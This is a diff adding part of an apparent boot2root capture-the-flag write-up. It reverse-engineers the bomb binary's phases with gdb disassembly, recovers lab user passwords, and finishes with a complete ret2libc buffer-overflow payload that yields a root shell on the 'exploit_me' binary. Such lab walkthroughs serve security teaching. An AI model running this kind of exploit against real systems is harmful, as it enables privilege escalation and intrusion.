@@ -393,4 +393,715 @@ Dump of assembler code for function phase_2:
 End of assembler dump.
 ```
 
+Get 6 numbers from the input line with the function `read_six_numbers`.
+Compare each numbers in a loop with an algorithm to get the expected value. Translate in C
 
+```C
+int i = 0;
+while (i <= 5) {
+    if (input_numbers[i] != (input_numbers[i - 1] * (i + 1)) {
+        explode_bomb();
+    }
+    i++;
+}
+```
+
+We make the same algorithm in python to get the numbers
+
+The expected numbers is: `1 2 6 24 120 720`
+
+### Phase 3
+
+```
+(gdb) disas phase_3
+   0x08048b98 <+0>:	    push   ebp
+   0x08048b99 <+1>:	    mov    ebp,esp
+   0x08048b9b <+3>:	    sub    esp,0x14
+   0x08048b9e <+6>:	    push   ebx
+   0x08048b9f <+7>:	    mov    edx,DWORD PTR [ebp+0x8]
+   0x08048ba2 <+10>:	add    esp,0xfffffff4
+   0x08048ba5 <+13>:	lea    eax,[ebp-0x4]
+   0x08048ba8 <+16>:	push   eax
+   0x08048ba9 <+17>:	lea    eax,[ebp-0x5]
+   0x08048bac <+20>:	push   eax
+   0x08048bad <+21>:	lea    eax,[ebp-0xc]
+   0x08048bb0 <+24>:	push   eax
+   0x08048bb1 <+25>:	push   0x80497de
+   0x08048bb6 <+30>:	push   edx
+   0x08048bb7 <+31>:	call   0x8048860 <sscanf@plt>
+   0x08048bbc <+36>:	add    esp,0x20
+   0x08048bbf <+39>:	cmp    eax,0x2
+   0x08048bc2 <+42>:	jg     0x8048bc9 <phase_3+49>
+   0x08048bc4 <+44>:	call   0x80494fc <explode_bomb>
+   0x08048bc9 <+49>:	cmp    DWORD PTR [ebp-0xc],0x7
+   0x08048bcd <+53>:	ja     0x8048c88 <phase_3+240>
+   0x08048bd3 <+59>:	mov    eax,DWORD PTR [ebp-0xc]
+   0x08048bd6 <+62>:	jmp    DWORD PTR [eax*4+0x80497e8]
+   0x08048bdd <+69>:	lea    esi,[esi+0x0]
+   0x08048be0 <+72>:	mov    bl,0x71
+   0x08048be2 <+74>:	cmp    DWORD PTR [ebp-0x4],0x309
+   0x08048be9 <+81>:	je     0x8048c8f <phase_3+247>
+   0x08048bef <+87>:	call   0x80494fc <explode_bomb>
+   0x08048bf4 <+92>:	jmp    0x8048c8f <phase_3+247>
+   0x08048bf9 <+97>:	lea    esi,[esi+eiz*1+0x0]
+   0x08048c00 <+104>:	mov    bl,0x62
+   0x08048c02 <+106>:	cmp    DWORD PTR [ebp-0x4],0xd6
+   0x08048c09 <+113>:	je     0x8048c8f <phase_3+247>
+   0x08048c0f <+119>:	call   0x80494fc <explode_bomb>
+   0x08048c14 <+124>:	jmp    0x8048c8f <phase_3+247>
+   0x08048c16 <+126>:	mov    bl,0x62
+   0x08048c18 <+128>:	cmp    DWORD PTR [ebp-0x4],0x2f3
+   0x08048c1f <+135>:	je     0x8048c8f <phase_3+247>
+   0x08048c21 <+137>:	call   0x80494fc <explode_bomb>
+   0x08048c26 <+142>:	jmp    0x8048c8f <phase_3+247>
+   0x08048c28 <+144>:	mov    bl,0x6b
+   0x08048c2a <+146>:	cmp    DWORD PTR [ebp-0x4],0xfb
+   0x08048c31 <+153>:	je     0x8048c8f <phase_3+247>
+   0x08048c33 <+155>:	call   0x80494fc <explode_bomb>
+   0x08048c38 <+160>:	jmp    0x8048c8f <phase_3+247>
+   0x08048c3a <+162>:	lea    esi,[esi+0x0]
+   0x08048c40 <+168>:	mov    bl,0x6f
+   0x08048c42 <+170>:	cmp    DWORD PTR [ebp-0x4],0xa0
+   0x08048c49 <+177>:	je     0x8048c8f <phase_3+247>
+   0x08048c4b <+179>:	call   0x80494fc <explode_bomb>
+   0x08048c50 <+184>:	jmp    0x8048c8f <phase_3+247>
+   0x08048c52 <+186>:	mov    bl,0x74
+   0x08048c54 <+188>:	cmp    DWORD PTR [ebp-0x4],0x1ca
+   0x08048c5b <+195>:	je     0x8048c8f <phase_3+247>
+   0x08048c5d <+197>:	call   0x80494fc <explode_bomb>
+   0x08048c62 <+202>:	jmp    0x8048c8f <phase_3+247>
+   0x08048c64 <+204>:	mov    bl,0x76
+   0x08048c66 <+206>:	cmp    DWORD PTR [ebp-0x4],0x30c
+   0x08048c6d <+213>:	je     0x8048c8f <phase_3+247>
+   0x08048c6f <+215>:	call   0x80494fc <explode_bomb>
+   0x08048c74 <+220>:	jmp    0x8048c8f <phase_3+247>
+   0x08048c76 <+222>:	mov    bl,0x62
+   0x08048c78 <+224>:	cmp    DWORD PTR [ebp-0x4],0x20c
+   0x08048c7f <+231>:	je     0x8048c8f <phase_3+247>
+   0x08048c81 <+233>:	call   0x80494fc <explode_bomb>
+   0x08048c86 <+238>:	jmp    0x8048c8f <phase_3+247>
+   0x08048c88 <+240>:	mov    bl,0x78
+   0x08048c8a <+242>:	call   0x80494fc <explode_bomb>
+   0x08048c8f <+247>:	cmp    bl,BYTE PTR [ebp-0x5]
+   0x08048c92 <+250>:	je     0x8048c99 <phase_3+257>
+   0x08048c94 <+252>:	call   0x80494fc <explode_bomb>
+   0x08048c99 <+257>:	mov    ebx,DWORD PTR [ebp-0x18]
+   0x08048c9c <+260>:	mov    esp,ebp
+   0x08048c9e <+262>:	pop    ebp
+   0x08048c9f <+263>:	ret    
+```
+
+Get 1 number, 1 char and 1 number from the command line. Apply a condition for check the matching of the numbers and the char together. Translate in C
+
+```C
+switch(first) {
+case 0:
+    c = 'q';
+    if (third != 777) {
+        explode_bomb();
+    }
+    break;
+case 1:
+    c = 'b';
+    if (third != 214) {
+        explode_bomb();
+    }
+    break;
+case 2:
+    c = 'b';
+    if (third != 755) {
+        explode_bomb();
+    }
+    break;
+case 3:
+    c = 'k';
+    if (third != 251) {
+        explode_bomb();
+    }
+    break;
+case 4:
+    c = 'o';
+    if (third != 160) {
+        explode_bomb();
+    }
+    break;
+case 5:
+    c = 't';
+    if (third != 458) {
+        explode_bomb();
+    }
+    break;
+case 6:
+    c = 'v';
+    if (third != 780) {
+        explode_bomb();
+    }
+    break;
+case 7:
+    c = 'b';
+    if (third != 524) {
+    explode_bomb();
+    }
+    break;
+default:
+    c = 'x';
+    explode_bomb();
+}
+if (c != second) {
+    explode_bomb();
+}
+```
+
+For the result, we have many possibilities, let's choose the first.
+
+Result: `0 q 777`
+
+### Phase 4
+
+```
+(gdb) disas phase_4
+   0x08048ce0 <+0>:	    push   ebp
+   0x08048ce1 <+1>:	    mov    ebp,esp
+   0x08048ce3 <+3>:	    sub    esp,0x18
+   0x08048ce6 <+6>:	    mov    edx,DWORD PTR [ebp+0x8]
+   0x08048ce9 <+9>:	    add    esp,0xfffffffc
+   0x08048cec <+12>:	lea    eax,[ebp-0x4]
+   0x08048cef <+15>:	push   eax
+   0x08048cf0 <+16>:	push   0x8049808
+   0x08048cf5 <+21>:	push   edx
+   0x08048cf6 <+22>:	call   0x8048860 <sscanf@plt>
+   0x08048cfb <+27>:	add    esp,0x10
+   0x08048cfe <+30>:	cmp    eax,0x1
+   0x08048d01 <+33>:	jne    0x8048d09 <phase_4+41>
+   0x08048d03 <+35>:	cmp    DWORD PTR [ebp-0x4],0x0
+   0x08048d07 <+39>:	jg     0x8048d0e <phase_4+46>
+   0x08048d09 <+41>:	call   0x80494fc <explode_bomb>
+   0x08048d0e <+46>:	add    esp,0xfffffff4
+   0x08048d11 <+49>:	mov    eax,DWORD PTR [ebp-0x4]
+   0x08048d14 <+52>:	push   eax
+   0x08048d15 <+53>:	call   0x8048ca0 <func4>
+   0x08048d1a <+58>:	add    esp,0x10
+   0x08048d1d <+61>:	cmp    eax,0x37
+   0x08048d20 <+64>:	je     0x8048d27 <phase_4+71>
+   0x08048d22 <+66>:	call   0x80494fc <explode_bomb>
+   0x08048d27 <+71>:	mov    esp,ebp
+   0x08048d29 <+73>:	pop    ebp
+   0x08048d2a <+74>:	ret   
+```
+
+Get 1 number from the command line. Applyan algorithm to check the number. Translate in C
+
+```C
+int func4(int nb) {
+    if (nb <= 1)
+        return 1;
+    int n1 = func4(nb - 1);
+    int n2 = func4(nb - 2);
+    return n1 + n2
+}
+
+void phase_4(char *line) {
+    int nb;
+    len = sscanf(line, "%d", nb)
+    if (len != 1) {
+        explode_bomb();
+    }
+    if (nb > 0) {
+        if (func4(nb) != 55)
+            explode_bomb();
+    }
+    return;
+}
+```
+
+We can write this function in python for testing all numbers and get the good number!
+
+Result: `9`
+
+### Phase 5
+
+```
+(gdb) disas phase_5
+   0x08048d2c <+0>:	    push   ebp
+   0x08048d2d <+1>:	    mov    ebp,esp
+   0x08048d2f <+3>:	    sub    esp,0x10
+   0x08048d32 <+6>:	    push   esi
+   0x08048d33 <+7>:	    push   ebx
+   0x08048d34 <+8>:	    mov    ebx,DWORD PTR [ebp+0x8]
+   0x08048d37 <+11>:	add    esp,0xfffffff4
+   0x08048d3a <+14>:	push   ebx
+   0x08048d3b <+15>:	call   0x8049018 <string_length>
+   0x08048d40 <+20>:	add    esp,0x10
+   0x08048d43 <+23>:	cmp    eax,0x6
+   0x08048d46 <+26>:	je     0x8048d4d <phase_5+33>
+   0x08048d48 <+28>:	call   0x80494fc <explode_bomb>
+   0x08048d4d <+33>:	xor    edx,edx
+   0x08048d4f <+35>:	lea    ecx,[ebp-0x8]
+   0x08048d52 <+38>:	mov    esi,0x804b220
+   0x08048d57 <+43>:	mov    al,BYTE PTR [edx+ebx*1]
+   0x08048d5a <+46>:	and    al,0xf
+   0x08048d5c <+48>:	movsx  eax,al
+   0x08048d5f <+51>:	mov    al,BYTE PTR [eax+esi*1]
+   0x08048d62 <+54>:	mov    BYTE PTR [edx+ecx*1],al
+   0x08048d65 <+57>:	inc    edx
+   0x08048d66 <+58>:	cmp    edx,0x5
+   0x08048d69 <+61>:	jle    0x8048d57 <phase_5+43>
+   0x08048d6b <+63>:	mov    BYTE PTR [ebp-0x2],0x0
+   0x08048d6f <+67>:	add    esp,0xfffffff8
+   0x08048d72 <+70>:	push   0x804980b
+   0x08048d77 <+75>:	lea    eax,[ebp-0x8]
+   0x08048d7a <+78>:	push   eax
+   0x08048d7b <+79>:	call   0x8049030 <strings_not_equal>
+   0x08048d80 <+84>:	add    esp,0x10
+   0x08048d83 <+87>:	test   eax,eax
+   0x08048d85 <+89>:	je     0x8048d8c <phase_5+96>
+   0x08048d87 <+91>:	call   0x80494fc <explode_bomb>
+   0x08048d8c <+96>:	lea    esp,[ebp-0x18]
+   0x08048d8f <+99>:	pop    ebx
+   0x08048d90 <+100>:	pop    esi
+   0x08048d91 <+101>:	mov    esp,ebp
+   0x08048d93 <+103>:	pop    ebp
+   0x08048d94 <+104>:	ret    
+```
+
+Take 1 string from the command line and apply an algorithm to translate the string with a correspondence table (a string "isrveawhobpnutfg") and match it with a string "giants". Translate in C
+
+```C
+void phase_5(char *line) {
+    int len = string_length(line);
+    if (len != 6) {
+        explode_bomb();
+    }
+    i = 0;
+    char *string = "isrveawhobpnutfg"
+    while (i != 5) {
+        line[i] = string[line[i] & 0xf];
+        i++;
+    }
+    if (strings_not_equal(line, "giants") != 0) {
+        explode_bomb();
+    }
+    return;
+}
+```
+
+Rewrite it in python for testing
+
+```py
+def phase_5(line):
+    static_string = "isrveawhobpnutfg"
+    r = ""
+    for c in line:
+        index = ord(c) & 0xf
+        r += static_string[index]
+    return r
+print(phase_5('abc'))
+```
+
+Print `srvea`
+
+The algorithm replace the alphabet with the correspondence table, starting at index 1 and not 0. Let's write a resolver in python
+
+Result: `opukmq`
+
+### Phase 6
+
+```
+(gdb) disas phase_6
+   0x08048d98 <+0>:	    push   ebp
+   0x08048d99 <+1>:	    mov    ebp,esp
+   0x08048d9b <+3>:	    sub    esp,0x4c
+   0x08048d9e <+6>:	    push   edi
+   0x08048d9f <+7>:	    push   esi
+   0x08048da0 <+8>:	    push   ebx
+   0x08048da1 <+9>:	    mov    edx,DWORD PTR [ebp+0x8]
+   0x08048da4 <+12>:	mov    DWORD PTR [ebp-0x34],0x804b26c
+   0x08048dab <+19>:	add    esp,0xfffffff8
+   0x08048dae <+22>:	lea    eax,[ebp-0x18]
+   0x08048db1 <+25>:	push   eax
+   0x08048db2 <+26>:	push   edx
+   0x08048db3 <+27>:	call   0x8048fd8 <read_six_numbers>
+   0x08048db8 <+32>:	xor    edi,edi
+   0x08048dba <+34>:	add    esp,0x10
+   0x08048dbd <+37>:	lea    esi,[esi+0x0]
+   0x08048dc0 <+40>:	lea    eax,[ebp-0x18]
+   0x08048dc3 <+43>:	mov    eax,DWORD PTR [eax+edi*4]
+   0x08048dc6 <+46>:	dec    eax
+   0x08048dc7 <+47>:	cmp    eax,0x5
+   0x08048dca <+50>:	jbe    0x8048dd1 <phase_6+57>
+   0x08048dcc <+52>:	call   0x80494fc <explode_bomb>
+   0x08048dd1 <+57>:	lea    ebx,[edi+0x1]
+   0x08048dd4 <+60>:	cmp    ebx,0x5
+   0x08048dd7 <+63>:	jg     0x8048dfc <phase_6+100>
+   0x08048dd9 <+65>:	lea    eax,[edi*4+0x0]
+   0x08048de0 <+72>:	mov    DWORD PTR [ebp-0x38],eax
+   0x08048de3 <+75>:	lea    esi,[ebp-0x18]
+   0x08048de6 <+78>:	mov    edx,DWORD PTR [ebp-0x38]
+   0x08048de9 <+81>:	mov    eax,DWORD PTR [edx+esi*1]
+   0x08048dec <+84>:	cmp    eax,DWORD PTR [esi+ebx*4]
+   0x08048def <+87>:	jne    0x8048df6 <phase_6+94>
+   0x08048df1 <+89>:	call   0x80494fc <explode_bomb>
+   0x08048df6 <+94>:	inc    ebx
+   0x08048df7 <+95>:	cmp    ebx,0x5
+   0x08048dfa <+98>:	jle    0x8048de6 <phase_6+78>
+   0x08048dfc <+100>:	inc    edi
+   0x08048dfd <+101>:	cmp    edi,0x5
+   0x08048e00 <+104>:	jle    0x8048dc0 <phase_6+40>
+   0x08048e02 <+106>:	xor    edi,edi
+   0x08048e04 <+108>:	lea    ecx,[ebp-0x18]
+   0x08048e07 <+111>:	lea    eax,[ebp-0x30]
+   0x08048e0a <+114>:	mov    DWORD PTR [ebp-0x3c],eax
+   0x08048e0d <+117>:	lea    esi,[esi+0x0]
+   0x08048e10 <+120>:	mov    esi,DWORD PTR [ebp-0x34]
+   0x08048e13 <+123>:	mov    ebx,0x1
+   0x08048e18 <+128>:	lea    eax,[edi*4+0x0]
+   0x08048e1f <+135>:	mov    edx,eax
+   0x08048e21 <+137>:	cmp    ebx,DWORD PTR [eax+ecx*1]
+   0x08048e24 <+140>:	jge    0x8048e38 <phase_6+160>
+   0x08048e26 <+142>:	mov    eax,DWORD PTR [edx+ecx*1]
+   0x08048e29 <+145>:	lea    esi,[esi+eiz*1+0x0]
+   0x08048e30 <+152>:	mov    esi,DWORD PTR [esi+0x8]
+   0x08048e33 <+155>:	inc    ebx
+   0x08048e34 <+156>:	cmp    ebx,eax
+   0x08048e36 <+158>:	jl     0x8048e30 <phase_6+152>
+   0x08048e38 <+160>:	mov    edx,DWORD PTR [ebp-0x3c]
+   0x08048e3b <+163>:	mov    DWORD PTR [edx+edi*4],esi
+   0x08048e3e <+166>:	inc    edi
+   0x08048e3f <+167>:	cmp    edi,0x5
+   0x08048e42 <+170>:	jle    0x8048e10 <phase_6+120>
+   0x08048e44 <+172>:	mov    esi,DWORD PTR [ebp-0x30]
+   0x08048e47 <+175>:	mov    DWORD PTR [ebp-0x34],esi
+   0x08048e4a <+178>:	mov    edi,0x1
+   0x08048e4f <+183>:	lea    edx,[ebp-0x30]
+   0x08048e52 <+186>:	mov    eax,DWORD PTR [edx+edi*4]
+   0x08048e55 <+189>:	mov    DWORD PTR [esi+0x8],eax
+   0x08048e58 <+192>:	mov    esi,eax
+   0x08048e5a <+194>:	inc    edi
+   0x08048e5b <+195>:	cmp    edi,0x5
+   0x08048e5e <+198>:	jle    0x8048e52 <phase_6+186>
+   0x08048e60 <+200>:	mov    DWORD PTR [esi+0x8],0x0
+   0x08048e67 <+207>:	mov    esi,DWORD PTR [ebp-0x34]
+   0x08048e6a <+210>:	xor    edi,edi
+   0x08048e6c <+212>:	lea    esi,[esi+eiz*1+0x0]
+   0x08048e70 <+216>:	mov    edx,DWORD PTR [esi+0x8]
+   0x08048e73 <+219>:	mov    eax,DWORD PTR [esi]
+   0x08048e75 <+221>:	cmp    eax,DWORD PTR [edx]
+   0x08048e77 <+223>:	jge    0x8048e7e <phase_6+230>
+   0x08048e79 <+225>:	call   0x80494fc <explode_bomb>
+   0x08048e7e <+230>:	mov    esi,DWORD PTR [esi+0x8]
+   0x08048e81 <+233>:	inc    edi
+   0x08048e82 <+234>:	cmp    edi,0x4
+   0x08048e85 <+237>:	jle    0x8048e70 <phase_6+216>
+   0x08048e87 <+239>:	lea    esp,[ebp-0x58]
+   0x08048e8a <+242>:	pop    ebx
+   0x08048e8b <+243>:	pop    esi
+   0x08048e8c <+244>:	pop    edi
+   0x08048e8d <+245>:	mov    esp,ebp
+   0x08048e8f <+247>:	pop    ebp
+   0x08048e90 <+248>:	ret    
+```
+
+Take 6 numbers from the input line. After open in Ghidra, we can see the program use 6 globals variables `nodeX` (`node1`, `node2`, etc), and apply a sort on it in a tab of int. Sorted by the numbers in the input. Let's print all the nodes values with gdb
+
+```
+(gdb) p node1
+$1 = 253
+(gdb) p node2
+$2 = 725
+(gdb) p node3
+$3 = 301
+(gdb) p node4
+$4 = 997
+(gdb) p node5
+$5 = 212
+(gdb) p node6
+$6 = 432
+```
+
+We need to know wich type of sorting. In the output of the program, there is a clue, the numbers start by `4`. The node4 is the biggest value, we can try in descending order `4 2 6 3 1 5`
+
+It's Good.
+
+Result: `4 2 6 3 1 5`
+
+All the values are:
+
+- `Public speaking is very easy.`
+- `1 2 6 24 120 720`
+- `0 q 777`
+- `9`
+- `opukmq`
+- `4 2 6 3 1 5`
+
+```
+$ ./bomb
+Welcome this is my little bomb !!!! You have 6 stages with
+only one life good luck !! Have a nice day!
+Public speaking is very easy.
+Phase 1 defused. How about the next one?
+1 2 6 24 120 720
+That's number 2.  Keep going!
+0 q 777
+Halfway there!
+9
+So you got that one.  Try this one.
+opukmq
+Good work!  On to the next...
+4 2 6 3 1 5
+Congratulations! You've defused the bomb!
+```
+
+The password for the user `thor` is all the values without spaces :
+
+`Publicspeakingisveryeasy.126241207200q7779opukmq426315`
+
+Ok... There is an error in the subject, need to inverse the last numbers...
+
+`Publicspeakingisveryeasy.126241207200q7779opukmq426135`
+
+Doesn't work... Let's try with other combinaisons for the phase_3 part, there are 8 possibilities
+
+The good one was `1 b 214`
+
+`Publicspeakingisveryeasy.126241207201b2149opekmq426135`
+
+## Thor
+
+There is 2 files
+
+```
+$ ls
+README  turtle
+
+$ cat README
+Finish this challenge and use the result as password for 'zaz' user.
+```
+
+The file `turtle` is a sequence of steps to reproduce. It's a famous method to learn programming
+
+Let's write a python script to parse the file et draw the instructions.
+
+We can see the word `SLASH` appears. The password doesn't work for the user `zaz`
+
+The password is the md5sum of the word `SLASH`
+
+`646da671ca01bb5d84dbb5fb2238dc8e`
+
+## Zaz
+
+There is a binary file `exploit_me` and a directory `mail`
+
+```
+$ ls
+exploit_me  mail
+
+$ ls -la mail
+total 1
+drwxr-x--- 3 zaz zaz 107 Oct  8  2015 .
+drwxr-x--- 4 zaz zaz 147 Oct 15  2015 ..
+drwxr-x--- 5 zaz zaz  99 Oct  8  2015 .imap
+-rwxr-x--- 1 zaz zaz  36 Oct  8  2015 .subscriptions
+-rwxr-x--- 1 zaz zaz   0 Oct  8  2015 INBOX.Drafts
+-rwxr-x--- 1 zaz zaz   0 Oct  8  2015 INBOX.Sent
+-rwxr-x--- 1 zaz zaz   0 Oct  8  2015 INBOX.Trash
+```
+
+Nothing clear to read in the mail directory. Let's exploit the binary
+
+```
+$ ./exploit_me 
+$ ./exploit_me coucou
+coucou
+$ ./exploit_me coucou coucou
+coucou
+```
+
+The program print the first argument
+
+```
+gdb-peda$ disas main
+Dump of assembler code for function main:
+   0x080483f4 <+0>:	    push   ebp
+   0x080483f5 <+1>:	    mov    ebp,esp
+   0x080483f7 <+3>:	    and    esp,0xfffffff0
+   0x080483fa <+6>:	    sub    esp,0x90
+   0x08048400 <+12>:	cmp    DWORD PTR [ebp+0x8],0x1
+   0x08048404 <+16>:	jg     0x804840d <main+25>
+   0x08048406 <+18>:	mov    eax,0x1
+   0x0804840b <+23>:	jmp    0x8048436 <main+66>
+   0x0804840d <+25>:	mov    eax,DWORD PTR [ebp+0xc]
+   0x08048410 <+28>:	add    eax,0x4
+   0x08048413 <+31>:	mov    eax,DWORD PTR [eax]
+   0x08048415 <+33>:	mov    DWORD PTR [esp+0x4],eax
+   0x08048419 <+37>:	lea    eax,[esp+0x10]
+   0x0804841d <+41>:	mov    DWORD PTR [esp],eax
+   0x08048420 <+44>:	call   0x8048300 <strcpy@plt>
+   0x08048425 <+49>:	lea    eax,[esp+0x10]
+   0x08048429 <+53>:	mov    DWORD PTR [esp],eax
+   0x0804842c <+56>:	call   0x8048310 <puts@plt>
+   0x08048431 <+61>:	mov    eax,0x0
+   0x08048436 <+66>:	leave  
+   0x08048437 <+67>:	ret    
+End of assembler dump.
+```
+
+There is a strcpy, try to overflow
+
+```
+(gdb-peda)$ pattern create 200 file
+Writing pattern of 200 chars to filename "file"
+
+(gdb-peda)$ r $(cat file)
+Starting program: /home/nico/42/boot2root/zaz/exploit_me $(cat file)
+AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA
+
+Program received signal SIGSEGV, Segmentation fault.
+[----------------------------------registers-----------------------------------]
+EAX: 0x0 
+EBX: 0x0 
+ECX: 0xffffffff 
+EDX: 0xffffffff 
+ESI: 0xf7fa0000 --> 0x1e4d6c 
+EDI: 0xf7fa0000 --> 0x1e4d6c 
+EBP: 0x41514141 ('AAQA')
+ESP: 0xffffd430 ("RAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")
+EIP: 0x41416d41 ('AmAA')
+EFLAGS: 0x10246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+Invalid $PC address: 0x41416d41
+[------------------------------------stack-------------------------------------]
+0000| 0xffffd430 ("RAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")
+0004| 0xffffd434 ("AASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")
+0008| 0xffffd438 ("ApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")
+0012| 0xffffd43c ("TAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")
+0016| 0xffffd440 ("AAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")
+0020| 0xffffd444 ("ArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")
+0024| 0xffffd448 ("VAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")
+0028| 0xffffd44c ("AAWAAuAAXAAvAAYAAwAAZAAxAAyA")
+[------------------------------------------------------------------------------]
+Legend: code, data, rodata, value
+Stopped reason: SIGSEGV
+0x41416d41 in ?? ()
+```
+
+We have an overflow, find the offset to overwrite EIP
+
+```
+(gdb-peda)$ pattern search
+Registers contain pattern buffer:
+...
+EIP+0 found at offset: 140
+...
+```
+
+The offset to overflow is 140, try it
+
+```
+(gdb-peda)$ r $(python2 -c 'print "A"*140+"BBBB"')
+Starting program: /home/nico/42/boot2root/zaz/exploit_me $(python2 -c 'print "A"*140+"BBBB"')
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB
+
+Program received signal SIGSEGV, Segmentation fault.
+[----------------------------------registers-----------------------------------]
+...
+EIP: 0x42424242 ('BBBB')
+....
+Stopped reason: SIGSEGV
+0x42424242 in ?? ()
+```
+
+Yes!
+
+Verify the protections
+
+```
+$ checksec --file=exploit_me 
+RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	Symbols		FORTIFY	Fortified	Fortifiable	FILE
+No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   66) Symbols	  No	0		1		exploit_me
+```
+
+No protections, now check ASLR
+
+```
+$ cat /proc/sys/kernel/randomize_va_space
+0
+```
+
+No ASLR, go exploit with a ret2libc like a warrior. For this, we need the addresses of the function `system`, `exit` and a string `/bin/sh`
+
+```
+(gdb) info proc map
+process 2673
+Mapped address spaces:
+
+	Start Addr   End Addr       Size     Offset objfile
+	 0x8048000  0x8049000     0x1000        0x0 /home/zaz/exploit_me
+	 0x8049000  0x804a000     0x1000        0x0 /home/zaz/exploit_me
+	0xb7e2b000 0xb7e2c000     0x1000        0x0 
+	0xb7e2c000 0xb7fcf000   0x1a3000        0x0 /lib/i386-linux-gnu/libc-2.15.so
+	0xb7fcf000 0xb7fd1000     0x2000   0x1a3000 /lib/i386-linux-gnu/libc-2.15.so
+	0xb7fd1000 0xb7fd2000     0x1000   0x1a5000 /lib/i386-linux-gnu/libc-2.15.so
+	0xb7fd2000 0xb7fd5000     0x3000        0x0 
+	0xb7fdb000 0xb7fdd000     0x2000        0x0 
+	0xb7fdd000 0xb7fde000     0x1000        0x0 [vdso]
+	0xb7fde000 0xb7ffe000    0x20000        0x0 /lib/i386-linux-gnu/ld-2.15.so
+	0xb7ffe000 0xb7fff000     0x1000    0x1f000 /lib/i386-linux-gnu/ld-2.15.so
+	0xb7fff000 0xb8000000     0x1000    0x20000 /lib/i386-linux-gnu/ld-2.15.so
+	0xbffdf000 0xc0000000    0x21000        0x0 [stack]
+(gdb) find 0xb7e2c000,0xb7fcf000,"/bin/sh"
+0xb7f8cc58
+1 pattern found.
+```
+
+The address of `"/bin/sh"` is `0xb7f8cc58`
+
+```
+(gdb) info function system
+All functions matching regular expression "system":
+
+Non-debugging symbols:
+0xb7e6b060  __libc_system
+0xb7e6b060  system
+0xb7f49550  svcerr_systemerr
+```
+
+The address of the fucntion system is `0xb7e6b060`
+
+```
+(gdb) info function exit
+All functions matching regular expression "exit":
+
+Non-debugging symbols:
+0xb7e5ebe0  exit
+0xb7e5ec10  on_exit
+0xb7e5ee20  __cxa_atexit
+0xb7e5efc0  quick_exit
+0xb7e5eff0  __cxa_at_quick_exit
+0xb7ee41d8  _exit
+0xb7f28500  pthread_exit
+0xb7f2dc10  __cyg_profile_func_exit
+0xb7f4c750  svc_exit
+0xb7f56c80  atexit
+```
+
+The address of the function exit is `0xb7e5ebe0`
+
+We have all the informations, now build the payload
+
+```
+140 offset + system + JUNK = exit + /bin/sh
+
+
+"A"*140 + "\x60\xb0\xe6\xb7" + "\xe0\xeb\xe5\xb7" + "\x58\xcc\xf8\xb7"
+```
+
+Exploit!
+
+```
+$ ./exploit_me $(python -c 'print "A"*140 + "\x60\xb0\xe6\xb7" + "\xe0\xeb\xe5\xb7" + "\x58\xcc\xf8\xb7"')
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA`�����X���
+# whoami
+root
+```
+
+We are root! Script it now
